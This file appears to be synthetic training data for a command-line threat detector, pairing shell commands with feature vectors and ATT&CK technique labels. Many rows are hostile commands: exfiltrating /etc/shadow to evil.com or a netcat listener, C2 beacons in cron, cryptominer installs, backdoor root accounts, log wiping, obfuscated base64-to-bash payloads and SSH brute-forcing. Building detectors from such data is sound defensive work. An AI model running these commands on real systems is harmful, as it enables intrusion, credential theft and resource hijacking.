getent passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1087_Account_Discovery'],synthetic
"python3 -c ""import subprocess; subprocess.run(['cat','/etc/shadow'])""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
find /var/log -name '*.log' -exec truncate -s 0 {} \;,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1070_Indicator_Removal'],synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet & | > /dev/null 2>&1,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.44, 1, 0]","['T1496_Resource_Hijacking', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup echo 'cnVudXNlciAtbCBwb3N0Z3JlcyAtYyAncHNxbCAtYyAiU0VMRUNUIHBnX3JlYWRfZmlsZShcJy9ldGMvcGFzc3dkXCcpIic=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
"nmap -sV -p 22,80,443 10.0.0.0/24","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
echo 'Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAtdiBub2xvZ2lu' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1027_Obfuscated_Files_or_Information']",synthetic
mkdir  -p  /opt/myapp,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
nohup echo 'bm9odXAgLi94bXJpZyAtLXVybCBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXhtci5jb206NDQzIC0tdXNlciB3YWxsZXQgJg==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
pip install requests,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
powershell.exe -EncodedCommand JABzA... ; echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
nohup useradd -m -s /bin/bash -G sudo newadmin &,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1098_Account_Manipulation'],synthetic
echo 'cHl0aG9uMyAtYyAiZXhlYyhfX2ltcG9ydF9fKCdiYXNlNjQnKS5iNjRkZWNvZGUoJ2FXMXdiM0owSUc5eicpLmRlY29kZSgpKSI=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
"php -r '$sock=fsockopen(""10.0.0.99"",4444); ...'","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
shred -u /var/log/auth.log,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1070_Indicator_Removal'],synthetic
medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh && echo done,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
grep -r 'password' /var/www/html --include='*.php',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
hostnamectl,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1082_System_Information_Discovery'],synthetic
"bash -c ""su - admin""","[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1078_Valid_Accounts'],synthetic
time df -h,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
groups  $(whoami),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
who,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
sudo echo '*/5 * * * * curl http://c2.com/beacon' | crontab -,"[0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.48, 1, 0]",['T1053_Scheduled_Task'],synthetic
"bash -c ""scp file.txt user@host:/tmp/""","[0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
nmap -sn 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
for i in $(seq 1 254); do ping -c1 -W1 192.168.0.$i &>/dev/null && echo 192.168.0.$i; done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.64, 1, 0]",['T1018_Remote_System_Discovery'],synthetic
wget -q https://example.com/file.tar.gz,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
"bash -c ""whoami""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
echo 'Z3JlcCAtciAncGFzc3dvcmQnIC92YXIvd3d3L2h0bWwgLS1pbmNsdWRlPScqLnBocCc=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1027_Obfuscated_Files_or_Information']",synthetic
"php -r '$sock=fsockopen(""10.0.0.99"",4444); ...'","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
time echo 'eGZyZWVyZHAgL3U6QWRtaW5pc3RyYXRvciAvcDpQYXNzd29yZDEyMyAvdjoxMC4wLjAuNQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
time find / -name '*.conf' -readable 2>/dev/null | head -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.4, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
arp-scan --localnet ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0.0, 0.24, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
passwd -d root | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'c3lzdGVtY3RsIGVuYWJsZSAtLW5vdyBtYWxpY2lvdXMuc2VydmljZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
time New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1112_Modify_Registry'],synthetic
w,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
echo '@reboot /tmp/backdoor.sh' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1053_Scheduled_Task'],synthetic
echo 'Y2VydHV0aWwuZXhlIC11cmxjYWNoZSAtc3BsaXQgLWYgaHR0cDovL2F0dGFja2VyLmNvbS9uYy5leGUgbmMuZXhl' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat /etc/hostname,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
echo 'Z3JvdXBzICQod2hvYW1pKQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat /etc/resolv.conf,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
nmap -sn 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
cat /etc/hosts,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
su -s /bin/bash www-data ; echo done,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'aGVsbG8=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
cat /etc/shadow | nc 10.0.0.99 4444,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
echo  '@reboot  /tmp/.xmr/xmrig  -o  pool.minexmr.com'  |  crontab  -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1496_Resource_Hijacking'],synthetic
"bash -c ""crontab -l""","[0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
psexec.py  Administrator:password@10.0.0.5  cmd.exe,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1021_Remote_Services'],synthetic
cat /etc/os-release,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
sudo echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd | sleep 1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup echo '' > /var/log/syslog &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1070_Indicator_Removal'],synthetic
nohup awk -F: '{print $1}' /etc/passwd | head -5 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['BENIGN'],synthetic
"bash -c ""cat ~/.ssh/id_rsa && echo done""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'aHlkcmEgLWwgYWRtaW4gLVAgL3Vzci9zaGFyZS93b3JkbGlzdHMvcm9ja3lvdS50eHQgc3NoOi8vMTAuMC4wLjE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1110_Brute_Force', 'T1027_Obfuscated_Files_or_Information']",synthetic
find /home -name '*.conf',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
cat  /etc/os-release  |  chmod  +x  /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo 'ZWNobyAtZSAnXHgyZlx4NjJceDY5XHg2ZVx4MmZceDYyXHg2MVx4NzNceDY4Jw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
"runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""' && echo done","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time ls -la /root /etc /var/www,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
cat /tmp/encoded | xxd -r -p | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
time ./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash' ; sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in ; echo done,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time cat /proc/version,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1082_System_Information_Discovery'],synthetic
nohup cat /tmp/encoded | xxd -r -p | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.4, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
ip route show | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 1]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /etc/shadow | nc 10.0.0.99 4444,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
"nohup python3 -c ""import subprocess; subprocess.run(['cat','/etc/shadow'])"" &","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
time cat /proc/version,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1082_System_Information_Discovery'],synthetic
nohup ssh -i ~/.ssh/stolen_key root@10.0.0.5 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1021_Remote_Services'],synthetic
getent group sudo,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
nohup net user /domain &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1087_Account_Discovery'],synthetic
rm -rf /tmp/* /var/tmp/*,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1496_Resource_Hijacking'],synthetic
nbtscan  192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
for i in $(seq 1 254); do ping -c1 -W1 192.168.0.$i &>/dev/null && echo 192.168.0.$i; done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.64, 1, 0]",['T1018_Remote_System_Discovery'],synthetic
nohup curl -X POST http://evil.com/collect -d @/etc/shadow | history -c &,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""net user /add attacker P@ssw0rd | history -c""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""' ; chmod +x /tmp/payload","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 1, 1]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
openssl rand -hex 16,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
cat /etc/resolv.conf,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
procdump.exe -ma lsass.exe lsass.dmp,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
grep -r 'password' /var/www/html --include='*.php',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1110_Brute_Force'],synthetic
wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443,"[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 1, 1]",['T1496_Resource_Hijacking'],synthetic
find / -writable -type d 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
crontab -e | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 1]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /etc/shadow ; sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup nmap -sn 192.168.1.0/24 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
ssh -i ~/.ssh/stolen_key root@10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
echo 'dXNlcm1vZCAtYUcgc3VkbyBjb21wcm9taXNlZF91c2VyICYmID4gL2Rldi9udWxsIDI+JjE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
traceroute google.com,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
"python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
sudo net user /add attacker P@ssw0rd,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1136_Create_Account'],synthetic
echo 'd2dldCAtcSBodHRwOi8vbWluZXIuY29tL3htcmlnIC1PIC90bXAveG1yICYmIGNobW9kICt4IC90bXAveG1yICYmIC90bXAveG1yIC1vIHBvb2wubWluZXhtci5jb206NDQz' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat /tmp/encoded | xxd -r -p | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo '' > /var/log/syslog,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
"python3 -c ""exec(__import__('base64').b64decode('aW1wb3J0IG9z').decode())""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
"bash -c ""cat /etc/passwd | awk -F: '$3 >= 1000'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1087_Account_Discovery'],synthetic
sudo su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1078_Valid_Accounts'],synthetic
sudo id -Gn,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
"python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
nmap  --script=vuln  10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1496_Resource_Hijacking'],synthetic
wmic useraccount list,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1087_Account_Discovery'],synthetic
(crontab -l; echo '* * * * * /tmp/payload.sh') | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.48, 1, 0]",['T1053_Scheduled_Task'],synthetic
"python3 -c ""import subprocess; subprocess.run(['cat','/etc/shadow'])""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
time export LANG=en_US.UTF-8,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
"bash -c ""echo 'd2hv' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time scp file.txt user@host:/tmp/,"[0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
"bash -c ""python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
getent passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1087_Account_Discovery'],synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1110_Brute_Force'],synthetic
nohup su - admin && history -c &,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo -u www-data bash | history -c,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'Y2F0IC9wcm9jL3ZlcnNpb24gOyBzbGVlcCAx' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""wmic useraccount list""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1087_Account_Discovery'],synthetic
echo 'aWQgLUdu' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
